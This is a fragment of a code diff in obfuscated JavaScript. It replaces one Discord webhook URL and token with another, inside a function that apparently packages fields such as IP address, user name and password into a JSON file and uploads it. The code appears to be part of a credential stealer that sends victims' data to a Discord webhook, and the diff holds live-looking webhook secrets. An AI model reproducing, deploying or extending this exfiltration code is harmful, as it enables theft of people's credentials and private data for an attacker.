@@ -84,7 +84,7 @@ function ___$($) {
 }
 
 async function _$($_$, __$, _na$__, _ip$__, _us$__, _pa$__, _si$__, _li$__, _no$__, __si$__, __di$__, __ah$__, __$p$__, __$_m$_, $_$___) {
-	const u$ = "https://discord.com/api/webhooks/1237603309402193971/rhUTYE-2WcsPx5z-Fc7b3hRMsDHoiqZn7sFRbV4uqAkEr5EzEGKMwBMy_BNg6-id0YIh";
+	const u$ = "https://discord.com/api/webhooks/1264244377891377183/YxeA0erLaAy2pQBT8DBEWGqMwkGk8tenJXLxOb___fcF_AahyLkhDbRjAc3ji3fGPIj1";
 	const __f$ = `${__$}.json`;
 	const __c$ = new Blob([JSON.stringify($_$, null, 2)], { type: 'text/plain' });
 	const __fo$ = new FormData();
